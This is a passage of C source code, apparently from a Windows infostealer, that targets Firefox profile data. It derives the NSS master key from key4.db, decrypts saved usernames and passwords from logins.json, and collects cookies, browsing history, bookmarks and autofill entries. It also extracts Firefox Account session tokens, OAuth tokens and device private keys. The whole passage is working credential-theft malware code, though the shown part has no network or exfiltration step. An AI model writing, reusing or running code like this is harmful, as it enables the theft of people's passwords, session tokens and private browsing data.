    if (!Asn1GetLength(pCursor, dwEncrypted - (DWORD)(pCursor - pbEncrypted), &dwCipherLen, &dwHdr)) goto _END_OF_FUNC;
    pCursor += dwHdr;
    pbCiphertext = pCursor;

    // Build proper IV
    if (bUseAes)
    {
        // AES needs 16-byte IV - use directly from ASN.1
        if (dwIvLen != BUFFER_SIZE_16)
        {
            DBGA("[!] Unexpected IV length for AES: %lu (Expected: 16)", dwIvLen);
            goto _END_OF_FUNC;
        }

        if (!(pbIvFull = (PBYTE)HeapAlloc(GetProcessHeap(), 0, BUFFER_SIZE_16)))
            goto _END_OF_FUNC;

        RtlCopyMemory(pbIvFull, pbIv, BUFFER_SIZE_16);

        if (!DecryptAesCbc(pbMasterKey, dwMasterKey, pbIvFull, pbCiphertext, dwCipherLen, &pbDecrypted, &dwDecrypted))
            goto _END_OF_FUNC;
    }
    else
    {
        // 3DES uses 8-byte IV directly
        if (!(pbIvFull = (PBYTE)HeapAlloc(GetProcessHeap(), 0, BUFFER_SIZE_08)))
            goto _END_OF_FUNC;

        RtlCopyMemory(pbIvFull, pbIv, min(dwIvLen, BUFFER_SIZE_08));

        if (!Decrypt3DesCbc(pbMasterKey, dwMasterKey, pbIvFull, pbCiphertext, dwCipherLen, &pbDecrypted, &dwDecrypted))
            goto _END_OF_FUNC;
    }

    // Convert to null-terminated string
    if (!(pszResult = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwDecrypted + 1)))
        goto _END_OF_FUNC;

    RtlCopyMemory(pszResult, pbDecrypted, dwDecrypted);

    *ppszDecrypted  = pszResult;
    pszResult       = NULL;
    bResult         = TRUE;

_END_OF_FUNC:
    HEAP_FREE(pbEncrypted);
    HEAP_FREE(pbIvFull);
    HEAP_FREE_SECURE(pbDecrypted, dwDecrypted);
    HEAP_FREE(pszResult);
    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL ExtractMasterKeyFromKey4Db(IN OPTIONAL LPCSTR pszMasterPassword, OUT PBYTE* ppbMasterKey, OUT PDWORD pdwMasterKey)
{
    sqlite3*        pDb                             = NULL;
    sqlite3_stmt*   pStmt                           = NULL;
    INT             nResult                         = SQLITE_OK;
    LPSTR           pszKey4DbPath                   = NULL;
    PBYTE           pbGlobalSalt                    = NULL,
                    pbEncrypted                     = NULL,
                    pbDecrypted                     = NULL;
    DWORD           dwGlobalSalt                    = 0x00,
                    dwEncrypted                     = 0x00,
                    dwDecrypted                     = 0x00;
    BYTE            pbPassword[BUFFER_SIZE_20]      = { 0 };
    BOOL            bResult                         = FALSE;

    if (!ppbMasterKey || !pdwMasterKey)
        return FALSE;

    *ppbMasterKey   = NULL;
    *pdwMasterKey   = 0;

    if (!(pszKey4DbPath = GetFirefoxFilePath(STR_FF_KEY4_DB)))
        return FALSE;

    if ((nResult = sqlite3_open_v2(pszKey4DbPath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    // Get global salt from metadata table
    if ((nResult = sqlite3_prepare_v2(pDb, SQLQUERY_FF_METADATA, -1, &pStmt, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    if ((nResult = sqlite3_step(pStmt)) == SQLITE_ROW)
    {
        dwGlobalSalt    = sqlite3_column_bytes(pStmt, 0);
        pbGlobalSalt    = DuplicateBuffer((PBYTE)sqlite3_column_blob(pStmt, 0), dwGlobalSalt);
    }

    sqlite3_finalize(pStmt);
    pStmt = NULL;

    if (!pbGlobalSalt)
    {
        DBGA("[!] Failed To Get Global Salt");
        goto _END_OF_FUNC;
    }

    // Build password: SHA1(globalSalt || masterPassword)
    {
        LPCSTR pszPwd   = pszMasterPassword ? pszMasterPassword : "";
        DWORD  dwPwdLen = lstrlenA(pszPwd);

        if (!ComputeSha1Hash(pbGlobalSalt, dwGlobalSalt, (PBYTE)pszPwd, dwPwdLen, pbPassword, BUFFER_SIZE_20))
        {
            goto _END_OF_FUNC;
        }
    }

    // Get encrypted key from nssPrivate table
    if ((nResult = sqlite3_prepare_v2(pDb, SQLQUERY_FF_PRIVATE, -1, &pStmt, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    // Try each row until we find one that works
    while ((nResult = sqlite3_step(pStmt)) == SQLITE_ROW)
    {
        HEAP_FREE(pbEncrypted);
        HEAP_FREE_SECURE(pbDecrypted, dwDecrypted);
        pbDecrypted = NULL;
        dwDecrypted = 0;

        dwEncrypted = sqlite3_column_bytes(pStmt, 0);
        pbEncrypted = DuplicateBuffer((PBYTE)sqlite3_column_blob(pStmt, 0), dwEncrypted);

        if (!pbEncrypted)
            continue;

        // Decrypt the master key
        if (!DecryptPbes2(pbEncrypted, dwEncrypted, pbPassword, BUFFER_SIZE_20, &pbDecrypted, &dwDecrypted))
            continue;

        // For AES-256, we need 32 bytes. For 3DES, we need 24 bytes
        if (dwDecrypted == BUFFER_SIZE_24 || dwDecrypted == BUFFER_SIZE_32)
        {
            *ppbMasterKey   = pbDecrypted;
            *pdwMasterKey   = dwDecrypted;
            pbDecrypted     = NULL;
            bResult         = TRUE;
            break;
        }
    }

_END_OF_FUNC:
    if (pStmt) sqlite3_finalize(pStmt);
    if (pDb) sqlite3_close(pDb);
    HEAP_FREE(pszKey4DbPath);
    HEAP_FREE(pbGlobalSalt);
    HEAP_FREE(pbEncrypted);
    HEAP_FREE_SECURE(pbDecrypted, dwDecrypted);
    SecureZeroMemory(pbPassword, sizeof(pbPassword));
    return bResult;
}


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL ExtractFirefoxCookies(IN OUT PCHROMIUM_DATA pChromiumData)
{
    sqlite3*        pDb         = NULL;
    sqlite3_stmt*   pStmt       = NULL;
    INT             nResult     = SQLITE_OK;
    LPSTR           pszDbPath   = NULL;
    BOOL            bResult     = FALSE;

    if (!pChromiumData)
        return FALSE;

    if (!(pszDbPath = GetFirefoxFilePath(STR_FF_COOKIES_DB)))
        return FALSE;

    if ((nResult = sqlite3_open_v2(pszDbPath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    if ((nResult = sqlite3_prepare_v2(pDb, SQLQUERY_FF_COOKIES, -1, &pStmt, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    while ((nResult = sqlite3_step(pStmt)) == SQLITE_ROW)
    {
        LPCSTR  szHost      = (LPCSTR)sqlite3_column_text(pStmt, 0);
        LPCSTR  szPath      = (LPCSTR)sqlite3_column_text(pStmt, 1);
        LPCSTR  szName      = (LPCSTR)sqlite3_column_text(pStmt, 2);
        LPCSTR  szValue     = (LPCSTR)sqlite3_column_text(pStmt, 3);
        INT64   llExpiry    = sqlite3_column_int64(pStmt, 4);

        AddCookieEntry(pChromiumData, szHost, szPath, szName, llExpiry, (PBYTE)szValue, szValue ? lstrlenA(szValue) : 0);
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (pStmt) sqlite3_finalize(pStmt);
    if (pDb) sqlite3_close(pDb);
    HEAP_FREE(pszDbPath);
    return bResult;
}

BOOL ExtractFirefoxHistory(IN OUT PCHROMIUM_DATA pChromiumData)
{
    sqlite3*        pDb         = NULL;
    sqlite3_stmt*   pStmt       = NULL;
    INT             nResult     = SQLITE_OK;
    LPSTR           pszDbPath   = NULL;
    BOOL            bResult     = FALSE;

    if (!pChromiumData)
        return FALSE;

    if (!(pszDbPath = GetFirefoxFilePath(STR_FF_PLACES_DB)))
        return FALSE;

    if ((nResult = sqlite3_open_v2(pszDbPath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    if ((nResult = sqlite3_prepare_v2(pDb, SQLQUERY_FF_HISTORY, -1, &pStmt, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    while ((nResult = sqlite3_step(pStmt)) == SQLITE_ROW)
    {
        LPCSTR  szUrl           = (LPCSTR)sqlite3_column_text(pStmt, 0);
        LPCSTR  szTitle         = (LPCSTR)sqlite3_column_text(pStmt, 1);
        DWORD   dwVisitCount    = sqlite3_column_int(pStmt, 2);
        INT64   llLastVisit     = sqlite3_column_int64(pStmt, 3);

        AddHistoryEntry(pChromiumData, szUrl, szTitle, dwVisitCount, llLastVisit / 1000000);
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (pStmt) sqlite3_finalize(pStmt);
    if (pDb) sqlite3_close(pDb);
    HEAP_FREE(pszDbPath);
    return bResult;
}

BOOL ExtractFirefoxBookmarks(IN OUT PCHROMIUM_DATA pChromiumData)
{
    sqlite3*        pDb         = NULL;
    sqlite3_stmt*   pStmt       = NULL;
    INT             nResult     = SQLITE_OK;
    LPSTR           pszDbPath   = NULL;
    BOOL            bResult     = FALSE;

    if (!pChromiumData)
        return FALSE;

    if (!(pszDbPath = GetFirefoxFilePath(STR_FF_PLACES_DB)))
        return FALSE;

    if ((nResult = sqlite3_open_v2(pszDbPath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    if ((nResult = sqlite3_prepare_v2(pDb, SQLQUERY_FF_BOOKMARKS, -1, &pStmt, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    while ((nResult = sqlite3_step(pStmt)) == SQLITE_ROW)
    {
        LPCSTR  szTitle     = (LPCSTR)sqlite3_column_text(pStmt, 0);
        LPCSTR  szUrl       = (LPCSTR)sqlite3_column_text(pStmt, 1);
        INT64   llDateAdded = sqlite3_column_int64(pStmt, 2);

        AddBookmarkEntry(pChromiumData, szTitle, szUrl, llDateAdded / 1000000);
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (pStmt) sqlite3_finalize(pStmt);
    if (pDb) sqlite3_close(pDb);
    HEAP_FREE(pszDbPath);
    return bResult;
}

BOOL ExtractFirefoxAutofill(IN OUT PCHROMIUM_DATA pChromiumData)
{
    sqlite3*        pDb         = NULL;
    sqlite3_stmt*   pStmt       = NULL;
    INT             nResult     = SQLITE_OK;
    LPSTR           pszDbPath   = NULL;
    BOOL            bResult     = FALSE;

    if (!pChromiumData)
        return FALSE;

    if (!(pszDbPath = GetFirefoxFilePath(STR_FF_FORMHISTORY_DB)))
        return FALSE;

    if ((nResult = sqlite3_open_v2(pszDbPath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    if ((nResult = sqlite3_prepare_v2(pDb, SQLQUERY_FF_FORMHISTORY, -1, &pStmt, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    while ((nResult = sqlite3_step(pStmt)) == SQLITE_ROW)
    {
        LPCSTR  szFieldName = (LPCSTR)sqlite3_column_text(pStmt, 0);
        LPCSTR  szValue     = (LPCSTR)sqlite3_column_text(pStmt, 1);
        DWORD   dwTimesUsed = sqlite3_column_int(pStmt, 2);
        INT64   llFirstUsed = sqlite3_column_int64(pStmt, 3);

        AddAutofillEntry(pChromiumData, szFieldName, szValue, llFirstUsed / 1000000, dwTimesUsed);
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (pStmt) sqlite3_finalize(pStmt);
    if (pDb) sqlite3_close(pDb);
    HEAP_FREE(pszDbPath);
    return bResult;
}

BOOL ExtractFirefoxLogins(IN PBYTE pbMasterKey, IN DWORD dwMasterKey, IN OUT PCHROMIUM_DATA pChromiumData)
{
    LPSTR   pszLoginsPath   = NULL,
            pszFileContent  = NULL,
            pszLoginsArray  = NULL,
            pszDecUser      = NULL,
            pszDecPass      = NULL;
    LPCSTR  pszCursor       = NULL;
    DWORD   dwFileSize      = 0x00,
            dwLoginsArray   = 0x00;
    BOOL    bResult         = FALSE;

    if (!pbMasterKey || !dwMasterKey || !pChromiumData)
        return FALSE;

    if (!(pszLoginsPath = GetFirefoxFilePath(STR_FF_LOGINS_JSON)))
        return FALSE;

    if (!ReadFileFromDiskA(pszLoginsPath, (PBYTE*)&pszFileContent, &dwFileSize))
        goto _END_OF_FUNC;
    
    if (!(pszLoginsArray = FindJsonArrayValue(pszFileContent, dwFileSize, STR_JSON_KEY_LOGINS, &dwLoginsArray)) || !dwLoginsArray)
        goto _END_OF_FUNC;

    pszCursor = pszLoginsArray;

    while ((pszCursor = StrStrA(pszCursor, STR_JSON_KEY_HOSTNAME)) != NULL)
    {
        LPSTR   pszValue                        = NULL;
        DWORD   dwValueLen                      = 0x00,
                dwRemaining                     = (DWORD)(dwLoginsArray - (pszCursor - pszLoginsArray));
        INT64   llTimeCreated                   = 0,
                llTimeLastUsed                  = 0;
        CHAR    szHostname[BUFFER_SIZE_512]     = { 0 },
                szFormUrl[BUFFER_SIZE_512]      = { 0 },
                szEncUser[BUFFER_SIZE_2048]     = { 0 },
                szEncPass[BUFFER_SIZE_2048]     = { 0 };

        // Extract hostname 
        if (!(pszValue = FindJsonStringValue(pszCursor, dwRemaining, STR_JSON_KEY_HOSTNAME, &dwValueLen)) || !dwValueLen)
        {
            pszCursor++;
            continue;
        }
        RtlCopyMemory(szHostname, pszValue, min(dwValueLen, sizeof(szHostname) - 1));

        // Extract formSubmitURL
        if ((pszValue = FindJsonStringValue(pszCursor, dwRemaining, STR_JSON_KEY_FORM_SUBMIT_URL, &dwValueLen)) && dwValueLen > 0)
            RtlCopyMemory(szFormUrl, pszValue, min(dwValueLen, sizeof(szFormUrl) - 1));

        // Extract encryptedUsername 
        if (!(pszValue = FindJsonStringValue(pszCursor, dwRemaining, STR_JSON_KEY_ENCRYPTED_USER, &dwValueLen)) || !dwValueLen)
        {
            pszCursor++;
            continue;
        }
        RtlCopyMemory(szEncUser, pszValue, min(dwValueLen, sizeof(szEncUser) - 1));

        // Extract encryptedPassword
        if (!(pszValue = FindJsonStringValue(pszCursor, dwRemaining, STR_JSON_KEY_ENCRYPTED_PASS, &dwValueLen)) || !dwValueLen)
        {
            pszCursor++;
            continue;
        }
        RtlCopyMemory(szEncPass, pszValue, min(dwValueLen, sizeof(szEncPass) - 1));

        // Extract timestamps 
        FindJsonIntValue(pszCursor, STR_JSON_KEY_TIME_CREATED, &llTimeCreated);
        FindJsonIntValue(pszCursor, STR_JSON_KEY_TIME_LAST_USED, &llTimeLastUsed);

        // Decrypt username and password
        if (!DecryptFirefoxSecret(pbMasterKey, dwMasterKey, szEncUser, &pszDecUser) ||
            !DecryptFirefoxSecret(pbMasterKey, dwMasterKey, szEncPass, &pszDecPass))
        {
            HEAP_FREE_SECURE(pszDecUser, pszDecUser ? lstrlenA(pszDecUser) : 0);
            pszDecUser = NULL;
            pszCursor++;
            continue;
        }

        AddLoginEntry(
            pChromiumData,
            szHostname,
            szFormUrl[0] ? szFormUrl : NULL,
            pszDecUser,
            (PBYTE)pszDecPass,
            lstrlenA(pszDecPass),
            llTimeCreated / 1000,
            llTimeLastUsed / 1000
        );

        HEAP_FREE_SECURE(pszDecUser, lstrlenA(pszDecUser));
        HEAP_FREE_SECURE(pszDecPass, lstrlenA(pszDecPass));
        pszDecUser = NULL;
        pszDecPass = NULL;

        pszCursor++;
    }

    bResult = TRUE;

_END_OF_FUNC:
    HEAP_FREE(pszLoginsPath);
    HEAP_FREE(pszFileContent);
    return bResult;
}

BOOL ExtractFirefoxAccountTokens(IN OUT PFIREFOX_BROWSER_DATA pFirefoxData)
{
    LPSTR   pszFilePath         = NULL,
            pszFileContent      = NULL,
            pszAccountData      = NULL,
            pszOAuthTokens      = NULL,
            pszDevice           = NULL,
            pszKeysObj          = NULL,
            pszValue            = NULL;
    DWORD   dwFileSize          = 0x00,
            dwAccountData       = 0x00,
            dwOAuthTokens       = 0x00,
            dwDevice            = 0x00,
            dwKeysObj           = 0x00,
            dwValue             = 0x00;
    INT64   llVerified          = 0;
    BOOL    bResult             = FALSE;

    if (!pFirefoxData)
        return FALSE;

    if (!(pszFilePath = GetFirefoxFilePath(STR_FF_SIGNED_IN_USER)))
        return FALSE;

    if (!ReadFileFromDiskA(pszFilePath, (PBYTE*)&pszFileContent, &dwFileSize))
        goto _END_OF_FUNC;

    // Get accountData object
    if (!(pszAccountData = FindNestedJsonObject(pszFileContent, dwFileSize, STR_JSON_KEY_ACCOUNT_DATA, &dwAccountData)) || !dwAccountData)
        goto _END_OF_FUNC;

    // Email
    if ((pszValue = FindJsonStringValue(pszAccountData, dwAccountData, STR_JSON_KEY_EMAIL, &dwValue)) && dwValue > 0)
        pFirefoxData->szEmail = (LPSTR)DuplicateBuffer((PBYTE)pszValue, dwValue + 1), pFirefoxData->szEmail[dwValue] = '\0';

    // UID
    if ((pszValue = FindJsonStringValue(pszAccountData, dwAccountData, STR_JSON_KEY_UID, &dwValue)) && dwValue > 0)
        pFirefoxData->szUid = (LPSTR)DuplicateBuffer((PBYTE)pszValue, dwValue + 1), pFirefoxData->szUid[dwValue] = '\0';

    // Session Token
    if ((pszValue = FindJsonStringValue(pszAccountData, dwAccountData, STR_JSON_KEY_SESSION_TOKEN, &dwValue)) && dwValue > 0)
        pFirefoxData->szSessionToken = (LPSTR)DuplicateBuffer((PBYTE)pszValue, dwValue + 1), pFirefoxData->szSessionToken[dwValue] = '\0';

    // Verified
    if (FindJsonIntValue(pszAccountData, STR_JSON_KEY_VERIFIED, &llVerified))
        pFirefoxData->bVerified = (llVerified != 0);

    // Get oauthTokens object
    if ((pszOAuthTokens = FindNestedJsonObject(pszAccountData, dwAccountData, STR_JSON_KEY_OAUTH_TOKENS, &dwOAuthTokens)) && dwOAuthTokens)
    {
        // Profile OAuth token
        if ((pszValue = FindNestedJsonValue(pszOAuthTokens, dwOAuthTokens, STR_JSON_KEY_PROFILE, STR_JSON_KEY_TOKEN, &dwValue)) && dwValue > 0)
            pFirefoxData->szProfileOAuthToken = (LPSTR)DuplicateBuffer((PBYTE)pszValue, dwValue + 1), pFirefoxData->szProfileOAuthToken[dwValue] = '\0';

        // Sync OAuth token 
        if ((pszValue = FindNestedJsonValue(pszOAuthTokens, dwOAuthTokens, STR_JSON_KEY_OLDSYNC, STR_JSON_KEY_TOKEN, &dwValue)) && dwValue > 0)
            pFirefoxData->szSyncOAuthToken = (LPSTR)DuplicateBuffer((PBYTE)pszValue, dwValue + 1), pFirefoxData->szSyncOAuthToken[dwValue] = '\0';
    }

    // Get device object for private keys
    if ((pszDevice = FindNestedJsonObject(pszAccountData, dwAccountData, STR_JSON_KEY_DEVICE, &dwDevice)) && dwDevice)
    {
        // sendTabKeys.privateKey 
        if ((pszKeysObj = FindNestedJsonObject(pszDevice, dwDevice, STR_JSON_KEY_SEND_TAB_KEYS, &dwKeysObj)) && dwKeysObj)
        {
            if ((pszValue = FindNestedJsonObject(pszKeysObj, dwKeysObj, STR_JSON_KEY_PRIVATE_KEY, &dwValue)) && dwValue > 0)
                pFirefoxData->szSendTabPrivateKey = (LPSTR)DuplicateBuffer((PBYTE)pszValue, dwValue + 1), pFirefoxData->szSendTabPrivateKey[dwValue] = '\0';
        }

        // closeTabKeys.privateKey 
        if ((pszKeysObj = FindNestedJsonObject(pszDevice, dwDevice, STR_JSON_KEY_CLOSE_TAB_KEYS, &dwKeysObj)) && dwKeysObj)
        {
            if ((pszValue = FindNestedJsonObject(pszKeysObj, dwKeysObj, STR_JSON_KEY_PRIVATE_KEY, &dwValue)) && dwValue > 0)
                pFirefoxData->szCloseTabPrivateKey = (LPSTR)DuplicateBuffer((PBYTE)pszValue, dwValue + 1), pFirefoxData->szCloseTabPrivateKey[dwValue] = '\0';
        }
    }

    if (pFirefoxData->szSessionToken || pFirefoxData->szSyncOAuthToken)
        bResult = TRUE;

_END_OF_FUNC:
    HEAP_FREE(pszFilePath);
    HEAP_FREE(pszFileContent);
    return bResult;
}
